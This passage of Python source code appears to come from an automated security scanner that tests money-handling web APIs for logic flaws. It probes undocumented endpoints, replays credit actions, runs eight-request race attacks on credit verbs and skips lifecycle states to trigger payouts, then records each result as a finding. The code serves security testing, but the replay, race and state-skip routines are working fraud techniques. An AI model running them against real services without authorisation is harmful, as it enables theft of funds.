    probe-grounded; the marker itself is registered only from the observed
    202/event shape (grounded-only, E6)."""
    try:
        from engine.window import classify_async, field_from_error
    except ImportError:                         # spine absent: v1 path
        return []
    p = env.register("seam")
    b = env.wallet(p)
    if not b:
        return []                               # not a money target
    for path in env.surface.get("endpoints", []) or []:
        low = str(path).lower()
        if any(w in low for w in ("async", "callback", "/events")):
            return []          # documented async seam: h_async covers it
    hit = None
    for noun in ASYNC_SEAM_NOUNS:
        if env.remaining() < 6:
            return []
        path = "/api/%s" % noun
        r = env.ex.request(p, "POST", path, body={}, phase=env.phase,
                           tag="seam-probe")
        if r["status"] not in (404, 405):
            hit = (noun, path, r)
            break
    if not hit:
        return []
    noun, path, probe = hit
    field = field_from_error(probe["resp_body"]) or "amount"
    amt = max(1, b // 2)
    r2 = env.ex.request(p, "POST", path, body={field: amt},
                        phase=env.phase, tag="seam-open")
    shape = classify_async(r2)
    if not shape:
        # resource exists but is not async-shaped: discovery fact only
        return [{"kind": "OBSERVATION", "tags": ["async-seam"],
                 "payload": {"async_seam": {"noun": noun, "path": path,
                                            "open_status": r2["status"]},
                            "evidence": "probe %d, open %d (not async "
                                        "shaped)" % (probe["status"],
                                                     r2["status"])}}]
    shape["principal"] = p.name
    shape["baseline"] = env.wallet(p)
    return [{"kind": "OBSERVATION", "tags": ["async-seam", "async-opened"],
             "payload": {"async_opened": shape,
                         "seam": {"noun": noun, "path": path,
                                  "field": field, "amount": amt,
                                  "baseline": shape["baseline"],
                                  "principal": p.name,
                                  "event": shape["event_path"]},
                         "evidence": "POST %s {} -> %d; POST %s {%s: %d} "
                                     "-> 202 %s" % (path, probe["status"],
                                                    path, field, amt,
                                                    shape["event_path"])}}]


def t_open_vocab(env):
    """G2+G4 (M2): the live surface, not the stale doc, is the truth.
    Probes the open value-noun / verb / subpath vocabularies (engine/surface
    — data, not code), folds every fact into a REVISED SURFACE that the
    caller publishes as a SURFACE_UPDATE, and records the doc-vs-live
    differential. Labour separation: a resource whose create answers 202 is
    an async seam — noun-DISCOVERED but handed to the window driver (M1),
    never verb-probed. Every fact is probe-grounded; a discovery without a
    named consumer is not fired (band-D lesson)."""
    try:
        from engine import surface as sf
    except ImportError:                         # spine absent: v1 path
        return []
    ex = env.ex
    graph = env.surface.get("resource_actions") or {}
    known_paths = env.surface.get("endpoints") or []
    guard = lambda: env.remaining() > EST["h_open_vocab"] // 2
    p = env.register("ov")
    if env.wallet(p) is None:
        return []                               # not a money target
    disc = {"resources": [], "actions": [], "verb_facts": [],
            "single_use": [], "readback": [], "mined_fields": {},
            "doc_suspect": sf.scan_traffic_suspect_docs(ex)}
    probed_objects = []                         # (resource) already verb-probed
    requests_before = ex.count

    def _verb_probe(res, oid, g):
        if res in probed_objects or not oid or not guard():
            return
        probed_objects.append(res)
        known_verbs = {a.get("verb") for a in g.get("actions", [])}
        vfs = sf.probe_verbs(ex, p, res, oid, known_verbs, env.phase, guard)
        disc["verb_facts"].extend(vfs)
        for vf in vfs:
            disc["actions"].append({"resource": res, "verb": vf["verb"],
                                    "path": vf["path"],
                                    "status": vf["status"]})
            if vf["verb"] in sf.CLAIM_CONSUME:
                second = sf.single_use_signature(ex, p, vf["path"],
                                                 env.phase)
                disc["single_use"].append(
                    {"resource": res, "verb": vf["verb"],
                     "first": vf["status"], "second": second,
                     "single_use": second == 409})

    # 1) noun existence probes over the open value vocabulary
    for hit in sf.probe_nouns(ex, p, known_paths, env.phase, guard):
        res = hit["noun"]
        g = graph.get(res) or {}
        if g.get("create"):
            continue                            # already known to the graph
        opened = sf.open_resource(ex, p, hit["path"], env.phase)
        entry = dict(hit, open_kind=opened["kind"],
                     open_status=opened["status"])
        if opened["kind"] == "object":
            body = opened["body"] if isinstance(opened["body"], dict) else {}
            oid = next((v for k, v in body.items()
                        if k.endswith("_id") and isinstance(v, str)), None)
            entry["object_id"] = oid
            entry["create_schema"] = {}
            mined = sf.money_fields(body, {})
            if mined:
                disc["mined_fields"][res] = mined
            _verb_probe(res, oid, g)
        elif opened["kind"] == "error" and opened["learned_field"]:
            # U3 analogue: the error contract names the create field
            entry["create_schema"] = {opened["learned_field"]:
                                      {"type": "integer", "minimum": 1}}
        disc["resources"].append(entry)

    # 2) doc-graph money resources: create one object, verb-probe it,
    #    mine the echo for price fields (GV-3's free evidence)
    cands = [(res, g) for res, g in graph.items()
             if g.get("create") and res not in _AUTH_RESOURCES and
             res not in probed_objects]
    cands.sort(key=lambda rg: -len(rg[1].get("mined_fields") or []))
    for res, g in cands:
        if len(probed_objects) >= 3 or not guard():
            break
        cr = env.create(p, g)
        if not cr:
            continue
        if cr["status"] == 202:
            continue                            # async seam: driver owns it
        oid = _object_id(res, cr)
        body = cr["resp_body"] if isinstance(cr["resp_body"], dict) else {}
        mined = sf.money_fields(body, g.get("create_schema") or {})
        if mined:
            merged = set(g.get("mined_fields") or ()) | set(mined)
            disc["mined_fields"][res] = sorted(merged)
        _verb_probe(res, oid, g)

    # 3) subpath probes on collection roots -> readback facts (GV-2 read)
    collections = [res for res, g in graph.items()
                   if (g.get("param") or g.get("create")) and
                   res not in _AUTH_RESOURCES]
    for rb in sf.probe_subpaths(ex, p, collections, env.phase, guard):
        disc["readback"].append(rb)

    if not (disc["resources"] or disc["actions"] or disc["readback"] or
            disc["mined_fields"]):
        return []                               # nothing discovered: honest
    revised = sf.merge(env.surface, disc)
    spend = ex.count - requests_before
    summary = {
        "undocumented_resources": sorted(a["noun"] for a in disc["resources"]),
        "undocumented_verbs": [{"resource": v["resource"],
                                "verb": v["verb"], "status": v["status"]}
                               for v in disc["verb_facts"]],
        "single_use": disc["single_use"],
        "readback_added": [rb["path"] for rb in disc["readback"]],
        "mined_fields": disc["mined_fields"],
        "doc_suspect": disc["doc_suspect"],
        "requests_spent": spend}
    return [{"kind": "SURFACE_UPDATE", "surface": revised,
             "payload": summary},
            {"kind": "OBSERVATION", "tags": ["open-vocab"],
             "payload": {"open_vocab": summary,
                         "evidence": "noun/verb/subpath probes over the "
                                     "live target (%d requests): %s "
                                     "undocumented verbs, readback +%s"
                                     % (spend,
                                        len(summary["undocumented_verbs"]),
                                        summary["readback_added"])}}]


def t_value_replay(env):
    """M2 follow-through (GV-1 shape), generalized in M3: a discovered verb
    that CREDITED the prober must be single-shot per object. Replay it twice
    on a FRESH object with wallet reads; two further positive credits on one
    object is an I1 violation — whatever the face value (M3: the old
    `c1+c2 >= 2x face` clause was a severity prior, not validity; rebook's
    10%-of-rate bonus repeated forever and failed it). Claim-family verbs
    are excluded — they have their own classification (single-use
    signature) and their guards, where they exist, refute."""
    facts = (env.surface.get("discoveries") or {}).get("verb_facts") or []
    su = {(s["resource"], s["verb"]) for s in
          (env.surface.get("discoveries") or {}).get("single_use", [])
          if s.get("single_use")}
    cands = [f for f in facts if f.get("credited") and
             (f["resource"], f["verb"]) not in su and
             f["verb"] not in ("consume", "redeem", "claim", "activate")]
    if not cands or env.remaining() < EST["h_value_replay"]:
        return []
    out = []
    for fact in cands[:4]:              # bound: at most 4 candidates tested
        if len(out) >= 2 or env.remaining() < EST["h_value_replay"] // 2:
            break
        res, verb = fact["resource"], fact["verb"]
        g = (env.surface.get("resource_actions") or {}).get(res) or {}
        if not g.get("create"):
            continue
        p = env.register("vrep")
        cr = env.create(p, g)
        if not cr or cr["status"] == 202:
            continue
        oid = _object_id(res, cr)
        if not oid:
            continue
        rb = cr["resp_body"] if isinstance(cr["resp_body"], dict) else {}
        face = _face_value(rb)
        path = "/api/%s/%s/%s" % (res, oid, verb)
        w0 = env.wallet(p)
        if w0 is None:
            continue
        r1 = env.ex.request(p, "POST", path, body={}, phase=env.phase,
                            tag="value-replay-1")
        w1 = env.wallet(p)
        r2 = env.ex.request(p, "POST", path, body={}, phase=env.phase,
                            tag="value-replay-2")
        w2 = env.wallet(p)
        if None in (w0, w1, w2):
            continue
        c1, c2 = w1 - w0, w2 - w1
        if c1 > 0 and c2 > 0 and r1["status"] == r2["status"] == 200:
            out.append(_finding(
                "FW-%s-REPLAY" % verb.upper(),
                "Credit verb '%s' on %s is repeatable: two further credits "
                "(%d + %d cents) on one object — the consumed/released "
                "state is never committed" % (verb, res, c1, c2),
                "critical", "I1", ["REPLAY"],
                "POST /api/%s/{id}/%s (replay)" % (res, verb),
                [{"object": oid, "face_value": face,
                  "replay_credits": [c1, c2],
                  "wallet": [w0, w1, w2],
                  "statuses": [r1["status"], r2["status"]],
                  "discovered_via": "open-vocab verb probe"}],
                ["any account", "own %s object" % res],
                ["multiply the object's value by replay count"]))
    return out


def t_credit_race(env):
    """M2 follow-through (GV-6 shape): a credited verb with NO single-use
    signature is a concurrency candidate. Last-byte race x8 on a FRESH
    object: exactly one winner is lawful; k >= 2 winners (wallet delta
    >= 2x face) is an I5 violation — the race primitive finally aimed at
    the discovered surface. Claim-family verbs are excluded (signature-
    marked); empirically the consume guard holds (probe_gv6.py: 1 winner
    x3) while release wins 8/8 (+800% of face)."""
    facts = (env.surface.get("discoveries") or {}).get("verb_facts") or []
    su = {(s["resource"], s["verb"]) for s in
          (env.surface.get("discoveries") or {}).get("single_use", [])
          if s.get("single_use")}
    cands = [f for f in facts if f.get("credited") and
             (f["resource"], f["verb"]) not in su and
             f["verb"] not in ("consume", "redeem", "claim", "activate")]
    if not cands or env.remaining() < EST["h_credit_race"]:
        return []
    for fact in cands:
        res, verb = fact["resource"], fact["verb"]
        g = (env.surface.get("resource_actions") or {}).get(res) or {}
        if not g.get("create"):
            continue
        p = env.register("crce")
        cr = env.create(p, g)
        if not cr or cr["status"] == 202:
            continue
        oid = _object_id(res, cr)
        if not oid:
            continue
        rb = cr["resp_body"] if isinstance(cr["resp_body"], dict) else {}
        face = _face_value(rb)
        path = "/api/%s/%s/%s" % (res, oid, verb)
        w0 = env.wallet(p)
        if w0 is None:
            continue
        results = env.ex.race(p, "POST", path, {}, n=8, phase=env.phase,
                              tag="credit-race")
        w1 = env.wallet(p)
        wins = [r for r in results if 200 <= (r["status"] or 0) < 300]
        if None in (w0, w1) or len(wins) < 2 or w1 - w0 < 2 * (face or 1):
            continue
        return [_finding(
            "FW-CREDIT-RACE",
            "Credit verb '%s' on %s has no per-object guard under "
            "concurrency: %d of 8 synchronised requests won, crediting "
            "%d cents (%dx face) on ONE object"
            % (verb, res, len(wins), w1 - w0,
               (w1 - w0) // face if face else 0),
            "critical", "I5", ["INTERRUPT", "REPLAY"],
            "POST /api/%s/{id}/%s (race x8)" % (res, verb),
            [{"object": oid, "face_value": face, "race_n": 8,
              "winners": len(wins), "wallet_delta": w1 - w0,
              "last_byte_sync": True, "statuses":
                  [r["status"] for r in results],
              "discovered_via": "open-vocab verb probe"}],
            ["any account", "own %s object" % res],
            ["multiply the object's value by race winners"])]
    return []


def t_state_skip(env):
    """M3 follow-through (GV-8 shape): a DISCOVERED terminal verb must not
    succeed from the pristine create state when the resource orders its
    lifecycle. Fresh object -> state echo -> invoke the terminal verb from
    state0 -> wallet delta (the payout the stale doc never promised); then,
    on a SECOND object, induce the lifecycle (engine/fsm): a 409-gated
    transition proves the resource enforces order elsewhere. Gated sibling
    found while the terminal verb succeeded from the pristine state = the
    FSM skip (I2). Without a gated sibling the observation is recorded and
    no finding fires (honest when settle-from-create is simply lawful)."""
    try:
        from engine import fsm
    except ImportError:                         # spine absent: v1 path
        return []
    facts = (env.surface.get("discoveries") or {}).get("verb_facts") or []
    cands = [f for f in facts if f.get("verb") in fsm.TERMINAL_VERBS]
    if not cands or env.remaining() < EST["h_state_skip"]:
        return []
    credited = {f["verb"] for f in facts if f.get("credited")}
    for fact in cands:
        if env.remaining() < EST["h_state_skip"]:
            break
        res, verb = fact["resource"], fact["verb"]
        g = (env.surface.get("resource_actions") or {}).get(res) or {}
        if not g.get("create"):
            continue
        p = env.register("ssk")
        cr = env.create(p, g)
        if not cr or cr["status"] == 202:
            continue
        oid = _object_id(res, cr)
        if not oid:
            continue
        state0 = fsm.read_state(env.ex, p, g, oid, env.phase)
        path = "/api/%s/%s/%s" % (res, oid, verb)
        w0 = env.wallet(p)
        rt = env.ex.request(p, "POST", path, body={}, phase=env.phase,
                            tag="terminal-skip")
        w1 = env.wallet(p)
        state1 = fsm.read_state(env.ex, p, g, oid, env.phase)
        if not (200 <= rt["status"] < 300) or None in (w0, w1) or \
                w1 <= w0:
            continue                # no pristine-state credit: honest stop
        # second object: induce the lifecycle for the gated-sibling evidence
        cr2 = env.create(p, g)
        if not cr2 or cr2["status"] == 202:
            continue
        oid2 = _object_id(res, cr2)
        induced = {"rows": [], "probes": 0}
        if oid2:
            induced = fsm.induce(
                env.ex, p, res, g, oid2,
                known_verbs={a.get("verb") for a in g.get("actions", [])},
                discovered_verbs=[f["verb"] for f in facts
                                  if f.get("resource") == res],
                phase=env.phase,
                budget_guard=lambda: env.remaining() > 6,
                exclude=credited)
        gated = fsm.gated_rows(induced)
        if not gated:
            env.notes.setdefault("state_observations", []).append(
                {"resource": res, "verb": verb, "from_state": state0,
                 "note": "terminal verb succeeded from the create state; "
                         "no 409-gated sibling found — not claimed as a "
                         "violation"})
            continue
        return [_finding(
            "FW-STATE-SKIP",
            "Terminal verb '%s' on %s succeeds straight from the pristine "
            "create state (%s): the %s payout lands while the induced "
            "lifecycle shows %d 409-gated transition(s) — the state machine "
            "is not enforced on the money path"
            % (verb, res, state0 or "created", res, len(gated)),
            "critical", "I2", ["SKIP"],
            "POST /api/%s/{id}/%s (from %s)" % (res, verb,
                                                state0 or "created"),
            [{"resource": res, "verb": verb, "from_state": state0,
              "after_state": state1, "wallet_delta": w1 - w0,
              "payout_response": rt["resp_body"],
              "gated_siblings": gated,
              "induced_probes": induced.get("probes"),
              "unmodeled_transition": "%s --%s--> credited (order skipped)"
                                      % (state0 or "created", verb),
              "discovered_via": "open-vocab verb fact"}],
            ["any account", "own %s object in its pristine state" % res],
            ["collect the %s payout without performing the lifecycle" % res])]
    return []


def t_fsm_live(env):
    """M3 (G3c): the live-induced FSM — the composition path behind the old
    dvlba-pinned probe library. Gate: >= 1 discovered undocumented verb fact
    (zero on truthful-doc targets, so dvlba/meridian never spend here).
    Walks the lifecycle verbs of ONE object (engine/fsm.induce — money
    verbs excluded: induction never moves value), publishes the induced
    transition table as an OBSERVATION the attack graph consumes, and
    flags transitions the walk caught answering 2xx at two different
    states (the built-in replay check) as I1 candidates."""
    try:
        from engine import fsm
    except ImportError:                         # spine absent: v1 path
        return []
    disc = (env.surface.get("discoveries") or {})
    facts = disc.get("verb_facts") or []
    if not facts or env.remaining() < EST["h_fsm_live"]:
        return []
    by_res = {}
    for f in facts:
        by_res.setdefault(f["resource"], []).append(f["verb"])
    for res, verbs in by_res.items():
        if env.remaining() < EST["h_fsm_live"]:
            break
        g = (env.surface.get("resource_actions") or {}).get(res) or {}
        if not g.get("create"):
            continue
        p = env.register("fsm")
        cr = env.create(p, g)
        if not cr or cr["status"] == 202:
            continue
        oid = _object_id(res, cr)
        if not oid:
            continue
        known = {a.get("verb") for a in g.get("actions", [])}
        induced = fsm.induce(
            env.ex, p, res, g, oid, known, verbs, phase=env.phase,
            budget_guard=lambda: env.remaining() > 6,
            exclude={f["verb"] for f in facts if f.get("credited")})
        out = [{"kind": "OBSERVATION", "tags": ["fsm-live"],
                "payload": {"induced_fsm": {
                    "resource": res, "state0": induced.get("state0"),
                    "rows": induced["rows"], "probes": induced["probes"],
                    "verbs_absent": induced["verbs_absent"],
                    "gated": fsm.gated_rows(induced)}}}]
        for verb, rows in fsm.replayable_rows(induced).items():
            out.append(_finding(
                "FW-TRANSITION-REPLAY",
                "State transition '%s' on %s is repeatable: the induced "
                "walk advanced the object state twice (%s) — the one-shot "
                "guard never commits" % (verb, res,
                                         [(r["state_before"],
                                           r["state_after"]) for r in rows]),
                "high", "I1", ["REPLAY"],
                "POST /api/%s/{id}/%s (induced replay)" % (res, verb),
                [{"resource": res, "verb": verb, "walk_rows": rows,
                  "induced_probes": induced.get("probes")}],
                ["any account", "own %s object" % res],
                ["re-run the transition to re-enter its target state"]))
        return out
    return []


RUNNERS = {"h_quota_race": t_quota_race, "h_arith_cycle": t_arith_cycle,
           "h_state_guard": t_state_guard, "h_async_toctou": t_async_toctou,
           "h_mass_assign": t_mass_assign, "h_cross_tenant": t_cross_tenant,
           "h_hidden_verbs": t_hidden_verbs,
           "h_terminal_credit": t_terminal_credit,
           "h_async_seam": t_async_seam, "h_open_vocab": t_open_vocab,
           "h_value_replay": t_value_replay, "h_credit_race": t_credit_race,
           "h_state_skip": t_state_skip, "h_fsm_live": t_fsm_live}


def run(tag, env):
    """Run one generic technique. Budget-guarded; prerequisite-honest."""
    fn = RUNNERS.get(tag)
    if fn is None:
        return []
    if env.remaining() < EST.get(tag, 20):
        env.notes.setdefault("skipped", []).append(
            {"tag": tag, "reason": "budget"})
        return []
    return fn(env) or []
